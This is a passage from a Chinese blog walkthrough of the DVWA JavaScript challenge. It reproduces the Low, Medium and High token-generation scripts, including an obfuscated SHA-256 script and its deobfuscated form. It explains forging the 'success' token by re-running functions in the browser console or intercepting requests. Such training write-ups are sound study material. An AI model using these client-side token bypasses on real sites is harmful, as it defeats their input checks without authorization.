    !function(n){"use strict";function t(n,t){var r=(65535&n)+(65535&t);return(n>>16)+(t>>16)+(r>>16)<<16|65535&r}function r(n,t){return n<<t|n>>>32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&r|~t&o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&o|r&~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r>>5]|=128<<r%32,n[14+(r+64>>>9<<4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e<n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r="",e=32*n.length;for(t=0;t<e;t+=8)r+=String.fromCharCode(n[t>>5]>>>t%32&255);return r}function d(n){var t,r=[];for(r[(n.length>>2)-1]=void 0,t=0;t<r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t<e;t+=8)r[t>>5]|=(255&n.charCodeAt(t/8))<<t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length>16&&(o=i(o,8*n.length)),r=0;r<16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e="";for(r=0;r<n.length;r+=1)t=n.charCodeAt(r),e+="0123456789abcdef".charAt(t>>>4&15)+"0123456789abcdef".charAt(15&t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}"function"==typeof define&&define.amd?define(function(){return A}):"object"==typeof module&&module.exports?module.exports=A:n.md5=A}(this);
    
        function rot13(inp) {
            return inp.replace(/[a-zA-Z]/g,function(c){return String.fromCharCode((c<="Z"?90:122)>=(c=c.charCodeAt(0)+13)?c:c-26);});
        }
    
        function generate_token() {
            var phrase = document.getElementById("phrase").value;
            document.getElementById("token").value = md5(rot13(phrase));
        }
    
        generate_token();
    </script>
    EOF;
    ?>
    
        

界面上尝试输入success-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325205400114.png)

这里其实就是每一个字符串都有自己的一个token，用的是md5(rot13)加密，只有对应上了才能提交成功。而这里直接提交，它的默认token是ChangeMe。

1.  可以直接在前端修改value然后去控制台再执行一遍js-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210007394.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210049422.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_ZmFuZ3poZW5naGVpdGk%2Cshadow_10%2Ctext_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81NDY0ODQxOQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210104644.png)-
    发现值已经改变，然后Submit-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210138197.png)
2.  还可以在控制台中直接-
    ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210309545.png)-
    然后抓包修改token值提交。

## Medium

### 源代码

    <?php
    $page[ 'body' ] .= '<script src="' . DVWA_WEB_PAGE_TO_ROOT . 'vulnerabilities/javascript/source/medium.js"></script>';
    ?>
    
        

    function do_something(e){for(var t="",n=e.length-1;n>=0;n--)t+=e[n];return t}setTimeout(function(){do_elsesomething("XX")},300);function do_elsesomething(e){document.getElementById("token").value=do_something(e+document.getElementById("phrase").value+"XX")}
    
        

尝试Low中的方法，在审查元素中修改success，然后控制台执行js。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210829675.png)![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210847426.png)然后就发现。。。。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210907742.png)-
Submit后

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325210922834.png)

## High

直接先尝试Low中的方法-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325211330673.png)-
不太行，还是先看看源代码

    
    var a=['fromCharCode','toString','replace','BeJ','\x5cw+','Lyg','SuR','(w(){\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=1c\x202I===\x271n\x27;q\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\x202L=!1R&&1c\x202M===\x271n\x27;q\x202o=!Y.2S&&1c\x202d===\x271n\x27&&2d.2Q&&2d.2Q.3S;p(2o){Y=3R}z\x20p(2L){Y=2M}q\x202G=!Y.3Q&&1c\x202g===\x271n\x27&&2g.X;q\x202s=1c\x202l===\x27w\x27&&2l.3P;q\x201y=!Y.3H&&1c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.3z(\x27\x27);q\x202w=[-3y,3x,3v,3w];q\x20U=[24,16,8,0];q\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\x204C.Q.2U.1I(1x)===\x27[1n\x201z]\x27}}p(1y&&(Y.50||!Z.1N)){Z.1N=w(1x){A\x201c\x201x===\x271n\x27&&1x.1w&&1x.1w.1J===Z}}q\x202m=w(1X,x){A\x20w(s){A\x20O\x20N(x,1d).S(s)[1X]()}};q\x202a=w(x){q\x20P=2m(\x271e\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\x20O\x20N(x)};P.S=w(s){A\x20P.1T().S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2m(T,x)}A\x20P};q\x202P=w(P,x){q\x201S=2O(\x222N(\x271S\x27)\x22);q\x201Y=2O(\x222N(\x271w\x27).1Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s){p(1c\x20s===\x272p\x27){A\x201S.2x(2n).S(s,\x274S\x27).1G(\x271e\x27)}z{p(s===2q||s===2T){1u\x20O\x201t(1l)}z\x20p(s.1J===Z){s=O\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\x201S.2x(2n).S(O\x201Y(s)).1G(\x271e\x27)}z{A\x20P(s)}};A\x202z};q\x202k=w(1X,x){A\x20w(G,s){A\x20O\x201P(G,x,1d).S(s)[1X]()}};q\x202f=w(x){q\x20P=2k(\x271e\x27,x);P.1T=w(G){A\x20O\x201P(G,x)};P.S=w(G,s){A\x20P.1T(G).S(s)};1g(q\x20i=0;i<1E.W;++i){q\x20T=1E[i];P[T]=2k(T,x)}A\x20P};w\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\x202h,T=1c\x20s;p(T!==\x272p\x27){p(T===\x271n\x27){p(s===2q){1u\x20O\x201t(1l)}z\x20p(1y&&s.1J===Z){s=O\x202r(s)}z\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}2h=1d}q\x20r,M=0,i,W=s.W,l=k.l;4t(M<W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M<W&&i<1k;++M){l[i>>2]|=s[M]<<U[i++&3]}}z{1g(i=k.1A;M<W&&i<1k;++M){r=s.1Q(M);p(r<R){l[i>>2]|=r<<U[i++&3]}z\x20p(r<2v){l[i>>2]|=(2t|(r>>6))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z\x20p(r<2A||r>=2E){l[i>>2]|=(2D|(r>>12))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}z{r=2C+(((r&23)<<10)|(s.1Q(++M)&23));l[i>>2]|=(2X|(r>>18))<<U[i++&3];l[i>>2]|=(R|((r>>12)&V))<<U[i++&3];l[i>>2]|=(R|((r>>6)&V))<<U[i++&3];l[i>>2]|=(R|(r&V))<<U[i++&3]}}}k.2u=i;k.L+=i-k.1A;p(i>=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L>4r){k.2i+=k.L/2H<<0;k.L=k.L%2H}A\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\x20l=k.l,i=k.2u;l[16]=k.1C;l[i>>2]|=2w[i&3];k.1C=l[16];p(i>=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i<<3|k.L>>>29;l[15]=k.L<<3;k.1W()};N.Q.1W=w(){q\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j<1k;++j){v=l[j-15];1a=((v>>>7)|(v<<25))^((v>>>18)|(v<<14))^(v>>>3);v=l[j-2];1b=((v>>>17)|(v<<15))^((v>>>19)|(v<<13))^(v>>>10);l[j]=l[j-16]+1a+l[j-7]+1b<<0}1D=b&c;1g(j=0;j<1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o<<0;d=v+4p<<0}z{1B=4v;v=l[0]-4w;h=v-4G<<0;d=v+4D<<0}k.2j=1O}z{1a=((a>>>2)|(a<<30))^((a>>>13)|(a<<19))^((a>>>22)|(a<<10));1b=((e>>>6)|(e<<26))^((e>>>11)|(e<<21))^((e>>>25)|(e<<7));1B=a&b;1j=1B^(a&c)^1D;1h=(e&f)^(~e&g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v<<0;d=v+1f<<0}1a=((d>>>2)|(d<<30))^((d>>>13)|(d<<19))^((d>>>22)|(d<<10));1b=((h>>>6)|(h<<26))^((h>>>11)|(h<<21))^((h>>>25)|(h<<7));1Z=d&a;1j=1Z^(d&b)^1B;1h=(h&e)^(~h&f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v<<0;c=v+1f<<0;1a=((c>>>2)|(c<<30))^((c>>>13)|(c<<19))^((c>>>22)|(c<<10));1b=((g>>>6)|(g<<26))^((g>>>11)|(g<<21))^((g>>>25)|(g<<7));1V=c&d;1j=1V^(c&a)^1Z;1h=(g&h)^(~g&e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v<<0;b=v+1f<<0;1a=((b>>>2)|(b<<30))^((b>>>13)|(b<<19))^((b>>>22)|(b<<10));1b=((f>>>6)|(f<<26))^((f>>>11)|(f<<21))^((f>>>25)|(f<<7));1D=b&c;1j=1D^(b&d)^1V;1h=(f&g)^(~f&h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v<<0;a=v+1f<<0}k.C=k.C+a<<0;k.B=k.B+b<<0;k.E=k.E+c<<0;k.F=k.F+d<<0;k.J=k.J+e<<0;k.I=k.I+f<<0;k.H=k.H+g<<0;k.D=k.D+h<<0};N.Q.1e=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x201e=m[(C>>28)&o]+m[(C>>24)&o]+m[(C>>20)&o]+m[(C>>16)&o]+m[(C>>12)&o]+m[(C>>8)&o]+m[(C>>4)&o]+m[C&o]+m[(B>>28)&o]+m[(B>>24)&o]+m[(B>>20)&o]+m[(B>>16)&o]+m[(B>>12)&o]+m[(B>>8)&o]+m[(B>>4)&o]+m[B&o]+m[(E>>28)&o]+m[(E>>24)&o]+m[(E>>20)&o]+m[(E>>16)&o]+m[(E>>12)&o]+m[(E>>8)&o]+m[(E>>4)&o]+m[E&o]+m[(F>>28)&o]+m[(F>>24)&o]+m[(F>>20)&o]+m[(F>>16)&o]+m[(F>>12)&o]+m[(F>>8)&o]+m[(F>>4)&o]+m[F&o]+m[(J>>28)&o]+m[(J>>24)&o]+m[(J>>20)&o]+m[(J>>16)&o]+m[(J>>12)&o]+m[(J>>8)&o]+m[(J>>4)&o]+m[J&o]+m[(I>>28)&o]+m[(I>>24)&o]+m[(I>>20)&o]+m[(I>>16)&o]+m[(I>>12)&o]+m[(I>>8)&o]+m[(I>>4)&o]+m[I&o]+m[(H>>28)&o]+m[(H>>24)&o]+m[(H>>20)&o]+m[(H>>16)&o]+m[(H>>12)&o]+m[(H>>8)&o]+m[(H>>4)&o]+m[H&o];p(!k.x){1e+=m[(D>>28)&o]+m[(D>>24)&o]+m[(D>>20)&o]+m[(D>>16)&o]+m[(D>>12)&o]+m[(D>>8)&o]+m[(D>>4)&o]+m[D&o]}A\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\x202b=[(C>>24)&u,(C>>16)&u,(C>>8)&u,C&u,(B>>24)&u,(B>>16)&u,(B>>8)&u,B&u,(E>>24)&u,(E>>16)&u,(E>>8)&u,E&u,(F>>24)&u,(F>>16)&u,(F>>8)&u,F&u,(J>>24)&u,(J>>16)&u,(J>>8)&u,J&u,(I>>24)&u,(I>>16)&u,(I>>8)&u,I&u,(H>>24)&u,(H>>16)&u,(H>>8)&u,H&u];p(!k.x){2b.4A((D>>24)&u,(D>>16)&u,(D>>8)&u,D&u)}A\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\x201w=O\x20Z(k.x?28:32);q\x201i=O\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\x201w};w\x201P(G,x,1v){q\x20i,T=1c\x20G;p(T===\x272p\x27){q\x20L=[],W=G.W,M=0,r;1g(i=0;i<W;++i){r=G.1Q(i);p(r<R){L[M++]=r}z\x20p(r<2v){L[M++]=(2t|(r>>6));L[M++]=(R|(r&V))}z\x20p(r<2A||r>=2E){L[M++]=(2D|(r>>12));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}z{r=2C+(((r&23)<<10)|(G.1Q(++i)&23));L[M++]=(2X|(r>>18));L[M++]=(R|((r>>12)&V));L[M++]=(R|((r>>6)&V));L[M++]=(R|(r&V))}}G=L}z{p(T===\x271n\x27){p(G===2q){1u\x20O\x201t(1l)}z\x20p(1y&&G.1J===Z){G=O\x202r(G)}z\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\x20O\x201t(1l)}}}z{1u\x20O\x201t(1l)}}p(G.W>1k){G=(O\x20N(x,1d)).S(G).27()}q\x201F=[],2e=[];1g(i=0;i<1k;++i){q\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\x20X})}}})();w\x202y(e){1g(q\x20t=\x22\x22,n=e.W-1;n>=0;n--)t+=e[n];A\x20t}w\x202J(t,y=\x224B\x22){1m.1o(\x221M\x22).1r=1q(1m.1o(\x221M\x22).1r+y)}w\x202B(e=\x224E\x22){1m.1o(\x221M\x22).1r=1q(e+1m.1o(\x221M\x22).1r)}w\x202K(a,b){1m.1o(\x221M\x22).1r=2y(1m.1o(\x222F\x22).1r)}1m.1o(\x222F\x22).1r=\x22\x22;4u(w(){2B(\x224M\x22)},4N);1m.1o(\x224P\x22).4Q(\x224R\x22,2J);2K(\x223O\x22,44);','||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW','split'];(function(c,d){var e=function(f){while(--f){c['push'](c['shift']());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j<e?'':h(parseInt(j/e)))+((j=j%e)>0x23?String[b('0x0')](j+0x1d):j[b('0x1')](0x24));};if(!''[b('0x2')](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if('wpA'!==b('0x3')){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b('0x4');};f=0x1;}}];h=function(){return b('0x4');};f=0x1;};while(f--){if(g[f]){if(b('0x5')===b('0x6')){return i[h];}else{d=d[b('0x2')](new RegExp('\x5cb'+h(f)+'\x5cb','g'),g[f]);}}}return d;}(b('0x7'),0x3e,0x137,b('0x8')[b('0x9')]('|'),0x0,{}));
    
        

这里的js代码应该是被混淆过了。用 [http://deobfuscatejavascript.com](http://deobfuscatejavascript.com/) 这个网站可以解除混淆。这里直接看最后一部分就行了

    function do_something(e) {
        for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
        return t
    }
    function token_part_3(t, y = "ZZ") {
        document.getElementById("token").value = sha256(document.getElementById("token").value + y)
    }
    function token_part_2(e = "YY") {
        document.getElementById("token").value = sha256(e + document.getElementById("token").value)
    }
    function token_part_1(a, b) {
        document.getElementById("token").value = do_something(document.getElementById("phrase").value)
    }
    document.getElementById("phrase").value = "";
    setTimeout(function() {
        token_part_2("XX")
    }, 300);
    document.getElementById("send").addEventListener("click", token_part_3);
    token_part_1("ABCD", 44);
    
        

最后这里指的是先执行token\_part\_2(“XX”)，但是由于设置了延时，所以其实是先执行token\_part\_1(“ABCD”, 44);，再执行token\_part\_2(“XX”)，而token\_part\_3被添加在提交按钮的click事件上，也就是点提交会触发执行。

所以在输入框输入success，控制台上执行token\_part\_1(1,2)和 token\_part\_2(“XX”)，然后点击按钮（token\_part\_3会被执行）。-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325213106989.png)

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F20210325212149940.png)

[查看原网页: blog.csdn.net](https://blog.csdn.net/weixin_54648419/article/details/114788667)





# Quote
